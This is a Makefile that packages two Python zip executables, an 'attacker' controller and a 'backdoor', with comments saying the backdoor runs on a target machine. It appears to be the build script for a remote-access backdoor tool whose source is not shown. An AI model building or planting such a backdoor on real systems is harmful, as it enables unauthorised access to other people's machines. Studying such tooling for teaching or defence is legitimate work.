all: attacker backdoor

# creates attacker executable file, make sure to run chmod +x attacker on attacker machine
attacker:
	zip -j attacker.zip ./attacker_folder/__main__.py config.py socket_with_buffer.py
	echo "# date: `date`" | cat - attacker.zip > attacker_temp
	echo '#!/usr/bin/env python3' | cat - attacker_temp > attacker
	rm attacker_temp
	rm attacker.zip
 
# creates backdoor executable file, make sure to run chmod +x backdoor on target machine
backdoor:
	zip -j backdoor.zip ./backdoor_folder/__main__.py config.py socket_with_buffer.py
	echo "# date: `date`" | cat - backdoor.zip > backdoor_temp
	echo '#!/usr/bin/env python3' | cat - backdoor_temp > backdoor
	rm backdoor_temp
	rm backdoor.zip

clean:
	rm attacker
	rm backdoor